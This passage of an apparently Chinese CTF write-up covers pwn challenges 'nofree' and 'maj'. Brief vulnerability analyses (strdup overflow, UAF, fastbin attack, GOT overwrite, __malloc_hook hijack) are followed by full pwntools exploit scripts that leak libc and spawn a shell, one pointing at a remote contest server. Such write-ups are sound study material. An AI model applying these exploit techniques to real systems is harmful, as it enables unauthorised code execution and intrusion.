number">7</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span><span class="token string">"\x71"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>victim_address<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token operator">+</span><span class="token string">"\x71"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>one_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span>create<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span>one_gadgets<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h1><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>没有free和show，只有malloc 0~0x90和edit功能：</p><p>malloc：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2020-guo-sai-chu-sai-pwn-ti-ji-lu/0.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2020-guo-sai-chu-sai-pwn-ti-ji-lu/1.png"></div><p>show:</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2020-guo-sai-chu-sai-pwn-ti-ji-lu/2.png"></div><p>这个题看了一个小时硬是没找到洞在哪儿，最后看了wp才知道利用strdup分配的chunk的size和我们写入chunk的size并不是分配的大小，strdup会根据字符串的大小来分配chunk，而输入内容可控，那么我们可以写入0x90，实际却分配0x20，这样就可以溢出。</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>第一步：利用溢出改topchunk，改topchunk后无限分配直到消耗完top chunk，精心分配top chunk最后的size为bss我们输入的那个size，这样就可以fastbin attack攻击，这里选择是0x60。<br>第二步：fastbin attack就可以控制chunklist<br>第三步：改chunklist中chunk地址控制的位置，同时写三个chunk分别为got.exit、got.atoi、got.atoi<br>第四步：改exit为ret，atoi为plt.printf，利用格式化字符串泄露libc地址<br>第五步：利用输入字符数控制改atoi的got表为system，输入/bin/sh</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>debug <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims             <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>itv     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># p = process('./feedback',env={'LD_PRELOAD':'./libc-2.23.so'})</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"124.70.197.50"</span><span class="token punctuation">,</span><span class="token number">9010</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./student_manager"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfe1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x90</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x70</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x50</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x90</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6021c0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x50</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x50</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6021c0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'exit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x00000000004006b9</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"%7$p"</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>data <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> data<span class="token number">-0x7ffff7dd2620</span><span class="token operator">+</span><span class="token number">0x7ffff7a0d000</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"aa"</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span><span class="token string">"aa"</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="maj"><a href="#maj" class="headerlink" title="maj"></a>maj</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题难点在于前面回答问题的逆向，但是我们爆破一下也很容易得到结果80。漏洞在于UAF，free无清空，有edit函数，无show函数。同理进行fastbin attack攻击。第一步io leak，第二步hijcking hook</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>debug <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims             <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>itv     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#p = process('./feedback',env={'LD_PRELOAD':'./libc-2.23.so'})</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"124.70.197.50"</span><span class="token punctuation">,</span><span class="token number">9010</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./student_manager"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"question\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"____?"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"yes_or_no?"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"index ?"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"index ?\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"content ?\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 3</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\xdd\x25"</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x20"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 4</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 5</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 6</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7ffff7dd2600</span><span class="token operator">+</span><span class="token number">0x7ffff7a0d000</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">"index ?"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">"content ?"</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 7</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 8</span>one_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span>sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">"index ?"</span><span class="token punctuation">,</span><span class="token string">"8"</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">"content ?"</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span>one_gadgets<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token 